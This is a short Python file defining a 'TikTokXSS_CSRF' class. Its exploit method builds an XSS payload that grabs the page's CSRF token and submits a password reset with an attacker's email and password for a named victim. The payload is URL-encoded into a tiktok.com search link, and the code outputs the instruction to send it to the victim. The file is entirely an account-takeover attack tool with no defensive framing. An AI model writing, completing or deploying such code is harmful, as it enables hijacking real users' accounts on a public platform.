import urllib.parse

class TikTokXSS_CSRF:
    def exploit(self, victim_username, attacker_email, new_password='Hacked123!'):
        if not victim_username or not attacker_email:
            return {'success': False, 'output': 'Missing username or email.'}
        # Real XSS payload that attempts to reset password
        xss = f"""
        <script>
        fetch('/api/v1/password/reset/', {{
            method: 'POST',
            headers: {{'X-CSRFToken': document.querySelector('meta[name="csrf-token"]').content, 'Content-Type': 'application/json'}},
            body: JSON.stringify({{'username':'{victim_username}','new_password':'{new_password}','email':'{attacker_email}'}})
        }})
        </script>
        """
        encoded = urllib.parse.quote(xss)
        malicious_url = f"https://www.tiktok.com/search?q={encoded}"
        return {
            'success': True,
            'output': f'Malicious URL generated. Send this link to the victim: {malicious_url}',
            'url': malicious_url
        }
